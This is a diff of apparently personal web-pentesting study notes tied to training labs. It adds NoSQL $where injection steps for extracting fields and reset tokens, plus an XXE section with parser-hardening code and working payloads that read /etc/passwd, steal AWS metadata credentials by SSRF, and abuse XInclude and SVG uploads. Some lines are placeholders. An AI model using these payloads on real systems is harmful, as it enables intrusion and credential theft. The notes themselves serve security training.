@@ -10,7 +10,7 @@
 1. [iNE - eWPT Web Application Penetration Tester](https://security.ine.com/certifications/ewpt-certification/)
 
 # Table of Contents
-**Server-side topics (13)**
+**Server-side topics (13~113 labs)**
 - [SQL Injection](#sql-injection)
   - [Lab](#sql-injection-lab)
 - [Path Traversal](#path-traversal)
@@ -38,7 +38,7 @@
 - [API](#api)
   - [Lab](#api)
 
-**Client-side topics (6)**
+**Client-side topics (6-61 labs)**
 - [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
   - [Lab](#csrf-cross-site-request-forgery)
 - [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
@@ -52,7 +52,7 @@
 - [WebSockets](#websockets)
   - [Lab](#websockets)
 
-**Advanced topics (11)**
+**Advanced topics (11~94 labs)**
 - [Insecure Deserialization](#insecure-deserialization)
 - [Web LLM Attacks](#web-llm-attacks)
 - [GraphQL API](#graphql-api)
@@ -1287,12 +1287,155 @@ Types: synxtax (break the NoSQL query syntax), operator (manipulate queries)
   - enumerate the password
     intruder >  GET /user/lookup?user=`administrator' %26%26+this.password.length+%3d%3d+'§8§`
     cluster bomb | payload 1: 0-7 | payload 2: a-z
-- Exploiting NoSQL operator injection to **extract unknown fields  ** 
+- Exploiting NoSQL operator injection to **extract unknown fields**
+  - Perform password reset for carlos function
+  - identify if a **$where** clause is being evaluated
+    - false > invalid username or password
+      ```
+      {
+        "username": "carlos",
+        "password": {
+          "$ne": "invalid"
+        },
+        "$where": "0"
+      }
+      ```
+    - true > account locked
+       ```
+      {
+        "username": "carlos",
+        "password": {
+          "$ne": "invalid"
+        },
+        "$where": "1"
+      }
+      ```
+  - **identify all the fields** on the user object
+    - intruder > $where":"Object.keys(this)[1].match('^.{}.*')"
+    ```
+       {
+        "username": "carlos",
+        "password": {
+          "$ne": "invalid"
+        },
+        "$where": "Object.keys(this)[0].match('^.{§§}§§.*')"
+       }
+    ```
+    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
+    - start attack > repeat the index 0, 1, 2, 3, ...
+    - Result: id, username, password, email, **changePwd**   
+  - **Retrieve token** value
+    - intruder > $where":"this.**YOURTOKENNAME**.match('^.{}.*')
+    ```
+    POST /login HTTP/2
+    {
+        "username": "carlos",
+        "password": {
+          "$ne": "invalid"
+        },
+        "$where": "this.changePwd.match('^.{§§}§§.*')"
+    }
+    ```
+    - cluster bomb | payload 1: Numbers 0-20 | payload 2: a-z, A-Z, and 0-9
+    - Result of token： 066ad5544cf9a375
+  - Get the new password page
+    - repeater > GET /forgot-password?YOURTOKENNAME=TOKENVALUE > Request in browser > Original session
 
 ## XXE Injection
-Content for XXE Injection...
+Interfere with an application's processing of XML to view files on the application server file system, and interact with any back-end or external system. Leveraging XXE to perform SSRF.
 
+| Term                      | Definition                                                                 | Example                                                        |
+|---------------------------|----------------------------------------------------------------------------|----------------------------------------------------------------|
+| **XML**                   | A language for encoding documents in a readable format for both humans and machines. | `<note><to>Tove</to><from>Jani</from><body>Don't forget me this weekend!</body></note>` |
+| **XML Entities**          | Placeholders for data in XML documents.                                    | `<!ENTITY name "value">`                                       |
+| **Document Type Definition (DTD)** | Rules that define the structure and allowed content of an XML document.            | `<!DOCTYPE note SYSTEM "note.dtd">`                            |
+| **XML Custom Entities**   | User-defined placeholders in XML to simplify content.                      | `<!ENTITY custom "This is a custom entity">`                   |
+| **XML External Entities (XXE)** | Custom entities that reference external data sources.                | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                    |
+
+**XXE attack types**
+- Exploiting XXE to retrieve files
+- Exploiting XXE to perform SSRF attacks
+- Exploiting blind XXE exfiltrate data out-of-band
+- Exploiting blind XXE to retrieve data via error messages
+
+**How to find and test for XXE vulnerabilities**
+- Testing for file retrieval by defining an external entity
+- Testing for blind XXE vulnerabilities by defining an external entity based on a URL (Burp Collaborator)
+- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML doc  by using an XInclude attack
+
+**Mitigation**
+- Disable External Entity Processing
+- Sanitize XML Input
+- Use Secure Libraries
+
+| **Language**           | **Library/Parser** | **Code to Disable XXE**                                           |
+|------------------------|---------------------|------------------------------------------------------------------|
+| **Java**               | DOM Parser          | ```java<br>factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);<br>``` |
+|                        | SAX Parser          | ```java<br>factory.setFeature("http://xml.org/sax/features/external-general-entities", false);<br>``` |
+| **Python**             | lxml                | ```python<br>parser = etree.XMLParser(resolve_entities=False)<br>``` |
+| **PHP**                | libxml              | ```php<br>libxml_disable_entity_loader(true);<br>``` |
+| **.NET (C#)**          | XmlReader           | ```csharp<br>settings.DtdProcessing = DtdProcessing.Ignore;<br>``` |
+| **JavaScript (Node.js)** | xml2js             | ```javascript<br>parseStringPromise(data, { explicitArray: false });<br>``` |
+  
 ### XXE Injection Lab
+- Exploiting XXE using external entities to **retrieve files**
+  - Original: POST /product/stock
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+   <stockCheck>
+     <productId>1</productId>
+     <storeId>1</storeId>
+   </stockCheck>
+  ```
+  - Insert **external entity definition**   
+  ```
+  <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+   <stockCheck>
+     <productId>&xxe;</productId>
+     <storeId>1</storeId>
+   </stockCheck>
+  ```
+- Exploiting XXE to perform **SSRF attacks**   
+  `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>`   
+  ```
+  Invalid product ID: {
+  "Code" : "Success",
+  "LastUpdated" : "2024-07-27T06:38:10.254304923Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "LXV3KdlXvSOWCyEXAvRZ",
+  "SecretAccessKey" : "LUN1SXrOIQwuNHqGBkybvvkXEE0YtdQWp0s09io9",
+  "Token" :    "DUz6RAWhqlG88IZPLdd0Ub5z5W2VVBFTpqonDCFCAZPd8AtRNQcJRQMyNnvKGLETEXVbqBxeuGt4OMXI87hkeYK5AWhOaRa5C1xKdviiTVMbn9LrtTktJGZOOdENDfqdgVZ31lloO8YcmDBUJmSjLntu7hWZxcpl9DkQpA6MVGPgPqzzfr78cNrZcTOCspN9z77CqHQhzrAEZVUOfCLfl4WpWnQiimURVkgNs1Yk36fgHBpFOVtAFiRdtUTW1TX4",
+  "Expiration" : "2030-07-26T06:38:10.254304923Z"
+   }
+  ```   
+- Exploiting **XInclude** to retrieve files
+  - use cases: 1) don't have control over the entire XML document, only a part of it 2) app returns the contents of an element we control
+  - Original: productId=2&storeId=1
+  - Modified: productId=`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`&storeId=1
+- Exploiting XXE via image **file upload**
+  - SVG workflow
+    - image upload? try a benign SVG file
+    - if it doesn't, can you bypass file validation?
+    - try to declare entities and exfil data in-band
+    - if entities work, but no in-band reflection, try out of band
+  - Post a comment and upload the SVG image > **create a local svg file**
+   ```
+   <?xml version="1.0" standalone="yes"?>
+   <!DOCTYPE test [
+     <!ENTITY xxe SYSTEM "file:///etc/hostname">
+   ]>
+   <svg width="128px" height="128px"
+        xmlns="http://www.w3.org/2000/svg"
+        xmlns:xlink="http://www.w3.org/1999/xlink"
+        version="1.1">
+     <text font-size="16" x="0" y="16">&xxe;</text>
+   </svg>
+   ``` 
+- ddd
+- ddd
+- ddd
+- ddd
+- ddd
 
 ## API
 Content for API...
